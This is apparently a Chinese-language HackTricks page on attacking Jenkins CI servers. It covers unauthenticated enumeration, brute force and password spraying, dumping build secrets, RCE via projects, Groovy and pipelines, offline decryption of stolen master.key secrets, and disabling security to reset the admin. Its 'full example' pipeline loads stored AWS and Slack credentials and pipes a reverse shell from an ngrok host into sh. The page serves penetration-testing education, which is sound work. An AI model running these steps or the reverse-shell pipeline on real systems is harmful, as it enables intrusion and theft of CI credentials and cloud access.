# Jenkins Security

{% hint style="success" %}
学习和练习 AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和练习 GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过提交 PRs 分享黑客技巧到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库。

</details>
{% endhint %}

## 基本信息

Jenkins 是一个工具，提供了一种简单的方法来建立几乎**任何**编程语言和源代码库的**持续集成**或**持续交付**（CI/CD）环境，使用流水线。此外，它自动化了各种常规开发任务。虽然 Jenkins 并没有消除**为各个步骤创建脚本的需要**，但它确实提供了一种比手动构建更快、更强大的方式来集成整个构建、测试和部署工具链。

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 未认证枚举

为了在没有认证的情况下搜索有趣的 Jenkins 页面（如 _/people_ 或 _/asynchPeople_，这会列出当前用户），你可以使用：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
检查是否可以在不需要身份验证的情况下执行命令：
```
msf> use auxiliary/scanner/http/jenkins_command
```
没有凭证的情况下，你可以查看 _**/asynchPeople/**_ 路径或 _**/securityRealm/user/admin/search/index?q=**_ 以获取 **用户名**。

你可以从路径 _**/oops**_ 或 _**/error**_ 获取 Jenkins 版本。

![](<../../.gitbook/assets/image (146).png>)

### 已知漏洞

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## 登录

在基本信息中，你可以查看 **所有登录 Jenkins 的方式**：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 注册

你可以找到允许你 **创建账户并登录** 的 Jenkins 实例。就这么简单。

### **SSO 登录**

如果存在 **SSO** **功能**/**插件**，你应该尝试使用测试账户（例如，测试 **Github/Bitbucket 账户**）**登录**应用程序。技巧来自[**这里**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)。

### 暴力破解

**Jenkins** 缺乏 **密码策略** 和 **用户名暴力破解缓解措施**。对用户进行 **暴力破解** 是必要的，因为可能存在 **弱密码** 或 **用户名作为密码** 的情况，甚至是 **反转用户名作为密码**。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### 密码喷洒

使用[这个 python 脚本](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py)或[这个 powershell 脚本](https://github.com/chryzsh/JenkinsPasswordSpray)。

### IP 白名单绕过

许多组织将 **SaaS-based source control management (SCM) systems**（如 GitHub 或 GitLab）与 **internal, self-hosted CI** 解决方案（如 Jenkins 或 TeamCity）结合使用。这种设置允许 CI 系统 **接收来自 SaaS source control vendors 的 webhook 事件**，主要用于触发流水线作业。

为实现这一点，组织会将 **SCM 平台的 IP 范围**列入 **白名单**，允许它们通过 **webhooks** 访问 **internal CI system**。然而，重要的是要注意，**任何人**都可以在 GitHub 或 GitLab 上创建一个 **账户**，并将其配置为 **触发 webhook**，可能会向 **internal CI system** 发送请求。

参考: [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## 内部 Jenkins 滥用

在这些场景中，我们假设你有一个有效的账户可以访问 Jenkins。

{% hint style="warning" %}
根据 Jenkins 中配置的 **Authorization** 机制和被攻陷用户的权限，你 **可能能够或不能执行以下攻击。**
{% endhint %}

更多信息请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 列出用户

如果你已经访问了 Jenkins，你可以在 [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) 列出其他注册用户。

### 转储构建以查找明文秘密

使用[这个脚本](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py)转储构建控制台输出和构建环境变量，希望能找到明文秘密。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **窃取 SSH 凭证**

如果被攻陷的用户**有足够的权限创建/修改新的 Jenkins 节点**，并且已经存储了访问其他节点的 SSH 凭证，他可以通过创建/修改节点并**设置一个记录凭证的主机**来**窃取这些凭证**，而无需验证主机密钥：

![](<../../.gitbook/assets/image (218).png>)

你通常会在**全局提供者** (`/credentials/`) 中找到 Jenkins 的 ssh 凭证，因此你也可以像转储其他秘密一样转储它们。更多信息请参见[**转储秘密部分**](./#dumping-secrets)。

### **Jenkins 中的 RCE**

在 Jenkins 服务器上获取**shell**，攻击者可以泄露所有的**秘密**和**环境变量**，并**利用同一网络中的其他机器**，甚至**收集云凭证**。

默认情况下，Jenkins 将**以 SYSTEM 身份运行**。因此，攻陷它将使攻击者获得**SYSTEM 权限**。

### **通过创建/修改项目实现 RCE**

创建/修改项目是一种在 Jenkins 服务器上获得 RCE 的方法：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **通过执行 Groovy 脚本实现 RCE**

你也可以通过执行 Groovy 脚本获得 RCE，这可能比创建新项目更隐蔽：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### 通过创建/修改 Pipeline 实现 RCE

你也可以通过**创建/修改 pipeline**获得 RCE：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline 利用

要利用 pipelines，你仍然需要访问 Jenkins。

### 构建 Pipelines

**Pipelines** 也可以用作**项目中的构建机制**，在这种情况下，可以配置一个**存储在仓库中的文件**，该文件将包含 pipeline 语法。默认情况下使用 `/Jenkinsfile`：

![](<../../.gitbook/assets/image (127).png>)

也可以**将 pipeline 配置文件存储在其他地方**（例如在其他仓库中），目的是**分离**仓库**访问**和 pipeline 访问。

如果攻击者对该文件有**写入权限**，他将能够**修改**它并**可能触发** pipeline，而无需访问 Jenkins。\
攻击者可能需要**绕过一些分支保护**（取决于平台和用户权限，可能会被绕过或无法绕过）。

执行自定义 pipeline 的最常见触发器是：

* **Pull request** 到主分支（或可能到其他分支）
* **Push 到主分支**（或可能到其他分支）
* **更新主分支**并等待其以某种方式执行

{% hint style="info" %}
如果你是**外部用户**，你不应该期望创建一个**PR 到其他用户/组织的主分支**并**触发 pipeline**... 但如果配置不当，你可能会通过利用这一点**完全攻陷公司**。
{% endhint %}

### Pipeline RCE

在前面的 RCE 部分中，已经指出了一种[**通过修改 pipeline 获得 RCE**](./#rce-creating-modifying-pipeline)的技术。

### 检查环境变量

可以为整个 pipeline 或特定阶段声明**明文环境变量**。这些环境变量**不应包含敏感信息**，但攻击者总是可以**检查所有 pipeline** 配置/Jenkinsfiles：
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

有关 Jenkins 通常如何处理 secrets 的信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Credentials 可以 **全局提供者范围** (`/credentials/`) 或 **特定项目范围** (`/job/<project-name>/configure`)。因此，为了提取所有的 credentials，你需要 **至少攻破所有包含 secrets 的项目** 并执行自定义/恶意管道。

还有另一个问题，为了在管道的 **env 中获取 secret**，你需要 **知道 secret 的名称和类型**。例如，如果你尝试将 **`usernamePassword`** **secret** 作为 **`string`** **secret** 加载，你会得到这个 **错误**：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
这里有一些常见的秘密类型的加载方式：
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
在本页末尾你可以**找到所有的凭证类型**：[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**一次性转储所有秘密**的最佳方法是**攻陷** **Jenkins** 机器（例如在**内置节点**上运行反向 shell），然后**泄露** **主密钥**和**加密的秘密**并离线解密它们。\
更多关于如何做到这一点的信息，请参见[节点和代理部分](./#nodes-and-agents)和[后期利用部分](./#post-exploitation)。
{% endhint %}

### 触发器

来自[文档](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)：`triggers` 指令定义了**重新触发 Pipeline 的自动化方式**。对于与 GitHub 或 BitBucket 等源集成的 Pipeline，`triggers` 可能不是必需的，因为基于 webhooks 的集成可能已经存在。目前可用的触发器有 `cron`、`pollSCM` 和 `upstream`。

Cron 示例：
```bash
triggers { cron('H */4 * * 1-5') }
```
查看**文档中的其他示例**。

### Nodes & Agents

一个**Jenkins实例**可能在**不同的机器上运行不同的agents**。从攻击者的角度来看，访问不同的机器意味着可以**窃取不同的潜在云凭证**或**不同的网络访问权限**，这些都可以被滥用来攻击其他机器。

有关更多信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

你可以在 `/computer/` 枚举**配置的节点**，通常你会发现**`Built-In Node`**（即运行Jenkins的节点）以及可能更多的节点：

![](<../../.gitbook/assets/image (249).png>)

**特别有趣的是攻陷Built-In节点**，因为它包含敏感的Jenkins信息。

要指示你希望在**内置Jenkins节点**上**运行** **pipeline**，可以在pipeline中指定以下配置：
```bash
pipeline {
agent {label 'built-in'}
```
### 完整示例

在特定代理中的流水线，带有cron触发器，具有流水线和阶段环境变量，在步骤中加载2个变量并发送反向shell：
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## 后渗透

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

你可以通过访问 `/credentials/` 列出 secrets，如果你有足够的权限。请注意，这只会列出 `credentials.xml` 文件中的 secrets，但**构建配置文件**中可能还有**更多的凭证**。

如果你能**查看每个项目的配置**，你也可以在其中看到用于访问存储库的**凭证（secrets）名称**和**项目的其他凭证**。

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

这些文件是**解密 Jenkins secrets**所需的：

* secrets/master.key
* secrets/hudson.util.Secret

这些**secrets 通常可以在以下文件中找到**：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

这是一个用于查找它们的正则表达式：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### 离线解密 Jenkins secrets

如果你已经获取了解密 secrets 所需的**密码**，使用[**这个脚本**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **来解密这些 secrets**。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### 从 Groovy 解密 Jenkins secrets
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 创建新的管理员用户

1. 访问 Jenkins 的 config.xml 文件，路径为 `/var/lib/jenkins/config.xml` 或 `C:\Program Files (x86)\Jenkins\`
2. 搜索 `<useSecurity>true</useSecurity>` 并将 **`true`** 改为 **`false`**。
   1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **重启** **Jenkins** 服务器：`service jenkins restart`
4. 现在再次访问 Jenkins 门户，这次 **Jenkins 不会要求任何凭据**。导航到 "**Manage Jenkins**" 重新设置 **管理员密码**。
5. 通过将设置改回 `<useSecurity>true</useSecurity>` **再次启用** **安全性**，并 **再次重启 Jenkins**。

## 参考资料

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

{% hint style="success" %}
学习和练习 AWS Hacking：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和练习 GCP Hacking：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过提交 PRs 分享黑客技巧到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库。

</details>
{% endhint %}
